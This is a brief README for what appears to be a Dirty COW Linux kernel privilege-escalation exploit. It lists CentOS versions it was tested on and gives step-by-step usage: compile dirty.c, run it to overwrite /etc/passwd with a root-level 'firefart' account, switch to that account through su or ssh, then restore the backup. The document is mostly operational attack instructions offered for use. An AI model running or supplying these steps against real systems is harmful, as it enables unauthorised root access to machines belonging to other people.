### Tested OS

| OS Ver | Kernel Ver | Result |
| ----- | ----- | ----- |
| CentOS release 6.6 (Final) | Linux 2.6.32-504.el6.x86_64 | :+1: | 
| CentOS release 5.9 (Final) | Linux 2.6.18-348.el5 | :x: |



### Uasge
1. `gcc -pthread dirty.c -o dirty -lcrypt`
2. `./dirty` or `./dirty my-new-password`
3. `su firefart` or `ssh firefart@...`
4. `mv /tmp/passwd.bak /etc/passwd`


### Others
+ https://dirtycow.ninja/
+ https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
